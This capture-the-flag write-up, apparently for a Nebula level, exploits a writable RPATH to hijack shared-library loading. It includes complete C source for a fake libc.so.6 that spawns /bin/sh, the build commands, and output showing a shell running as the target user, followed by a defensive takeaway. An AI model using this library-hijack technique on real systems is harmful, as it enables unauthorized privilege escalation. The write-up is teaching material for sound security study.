
---
### 📜 Challenge Description

> A binary named `flag15` located in `/home/flag15/` checks for libraries in a custom path. The challenge hints at **shared library hijacking** through `RPATH` and `dlopen` behavior.

**Login:** `level15 : level15`  
**Goal:** Gain shell execution as `flag15` and retrieve the flag.

---

### 🔍 Primary Lookup

#### 🛠️ Step 1: Use `strace` to Monitor Library Loading

```bash
strace /home/flag15/flag15
```

The output reveals that the binary attempts to load shared libraries from:

```
/var/tmp/flag15/libc.so.6
```

#### 🔎 Step 2: Confirm RPATH

```bash
objdump -p /home/flag15/flag15 | grep RPATH
```

✅ Output:

```
RPATH                /var/tmp/flag15
```

This confirms the binary searches `/var/tmp/flag15` **before** the standard library paths. We can exploit this by creating a **malicious `libc.so.6`**.

---

### ⚔️ Plan of Action

Hijack the library loading mechanism to execute arbitrary code (in this case, spawn a shell) by injecting a fake `libc.so.6`.

---

### 🛠️ Step-by-Step Exploit

#### 🧱 Step 1: Create the Malicious Library

```c
// dummy_libc.c
#include <stdlib.h>

int __libc_start_main(int (*main)(int, char **, char **),
                      int argc, char **ubp_av,
                      void (*init)(void), void (*fini)(void),
                      void (*rtld_fini)(void), void *stack_end) {
    system("/bin/sh");
    return 0;
}
```

#### 📜 Step 2: Create a Version Script

```ld
// version.ld
GLIBC_2.0 {
  global:
    __libc_start_main;
  local:
    *;
};
```

#### 🧪 Step 3: Compile the Fake `libc.so.6`

```bash
mkdir /var/tmp/flag15
cd /var/tmp/flag15

gcc -shared -static-libgcc -fPIC \
    -Wl,--version-script=version.ld,-Bstatic \
    dummy_libc.c -o libc.so.6
```

> This creates a minimal but effective fake `libc.so.6` that immediately spawns a shell upon loading.

---

### 🚀 Step 4: Run the Vulnerable Binary

```bash
/home/flag15/flag15
```

✅ A shell is spawned.

---

### 🏁 Step 5: Capture the Flag

```bash
id
# uid=1016(level15) gid=1016(level15) euid=984(flag15)

getflag
# You have successfully executed getflag on a target account
```

---

### 🧹 Cleanup

As per good practice, remove the malicious directory:

```bash
rm -rf /var/tmp/flag15
```

---

### 📘 Conclusion

This level demonstrates a **classic RPATH/shared library hijack** vulnerability. By placing a malicious `libc.so.6` in a directory listed in the binary’s `RPATH`, you gain code execution as the binary's user.

🔐 **Security Takeaway:**

> Avoid hardcoding unsafe `RPATH` values. Prefer `RUNPATH` or no custom paths at all. Restrict permissions and always validate and verify shared object integrity in sensitive binaries.

---
